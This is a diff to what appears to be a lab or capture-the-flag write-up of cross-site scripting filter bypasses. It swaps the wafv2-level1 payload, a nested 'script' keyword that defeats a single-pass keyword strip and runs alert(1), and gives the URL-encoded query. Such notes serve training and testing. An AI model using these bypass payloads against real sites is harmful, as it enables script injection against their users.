@@ -4,10 +4,10 @@ Round-2 WAF-style filter bypasses (keyword strip, event-handler strip, function 
 
 ### wafv2-level1
 
-`/wafv2/level1/?query=%3Cscr%3Cscript%3Eipt%3Ealert(1)%3C/scr%3C/script%3Eipt%3E`
+`/wafv2/level1/?query=%3Cscrscriptipt%3Ealert(1)%3C/scrscriptipt%3E`
 
-- payload: `<scr<script>ipt>alert(1)</scr</script>ipt>`
-- context: single-pass case-insensitive `script` strip — outer fragments rejoin
+- payload: `<scrscriptipt>alert(1)</scrscriptipt>`
+- context: single-pass case-insensitive strip of the word `script`; nest the word
 
 ### wafv2-level2
 
